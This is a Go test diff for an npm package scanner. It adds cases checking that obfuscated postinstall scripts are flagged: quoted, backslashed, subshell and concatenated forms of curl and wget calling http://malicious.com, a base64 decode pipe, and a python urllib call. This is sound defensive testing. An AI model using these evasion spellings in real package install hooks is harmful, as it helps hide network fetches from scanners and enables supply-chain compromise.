@@ -1,6 +1,7 @@
 package npm
 
 import (
+	"encoding/json"
 	"path/filepath"
 	"testing"
 
@@ -84,5 +85,76 @@ func TestLockfileBlockedPackage(t *testing.T) {
 	}
 	if !found {
 		t.Fatalf("expected blocked_package reason for axios, got reasons: %+v", res.Reasons)
+	}
+}
+
+func TestStaticDetectionBypasses(t *testing.T) {
+	pol := policy.Default()
+
+	tests := []struct {
+		name       string
+		script     string
+		expectedID string
+	}{
+		{
+			name:       "quoted curl",
+			script:     "c'u'r'l http://malicious.com",
+			expectedID: "network_command_in_lifecycle",
+		},
+		{
+			name:       "backslashed wget",
+			script:     "w\\g\\e\\t http://malicious.com",
+			expectedID: "network_command_in_lifecycle",
+		},
+		{
+			name:       "subshell curl",
+			script:     "c$()url http://malicious.com",
+			expectedID: "network_command_in_lifecycle",
+		},
+		{
+			name:       "concatenated curl",
+			script:     "cu + rl http://malicious.com",
+			expectedID: "network_command_in_lifecycle",
+		},
+		{
+			name:       "long base64 payload",
+			script:     "echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQg | base64 -d",
+			expectedID: "obfuscated_script",
+		},
+		{
+			name:       "python interpreter call",
+			script:     "python -c 'import urllib'",
+			expectedID: "obfuscated_script",
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			pj := PackageJSON{
+				Name:    "test-bypass",
+				Version: "1.0.0",
+				Scripts: map[string]string{
+					"postinstall": tc.script,
+				},
+			}
+			b, err := json.Marshal(pj)
+			if err != nil {
+				t.Fatal(err)
+			}
+			res, err := AnalyzePackageJSON(b, pol)
+			if err != nil {
+				t.Fatal(err)
+			}
+			found := false
+			for _, r := range res.Reasons {
+				if r.ID == tc.expectedID {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Errorf("expected script %q to flag reason %q, got reasons: %+v", tc.script, tc.expectedID, res.Reasons)
+			}
+		})
 	}
 }
